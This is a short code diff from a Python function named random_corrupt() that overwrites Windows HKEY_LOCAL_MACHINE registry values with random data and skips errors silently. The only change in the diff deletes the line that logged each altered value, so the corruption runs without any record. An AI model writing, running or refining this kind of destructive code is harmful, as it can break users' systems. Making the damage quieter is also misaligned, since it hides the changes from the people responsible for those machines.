@@ -101,7 +101,6 @@ def random_corrupt():
                         new_val = randomize_val(val, typ)
                         try:
                             winreg.SetValueEx(k, name, 0, typ, new_val)
-                            print(f"Randomized HKEY_LOCAL_MACHINE\\{current_path}\\{name} from {val} to {new_val}")
                             modified = True
                         except (PermissionError, OSError) as e:
                             # Skip individual value errors silently
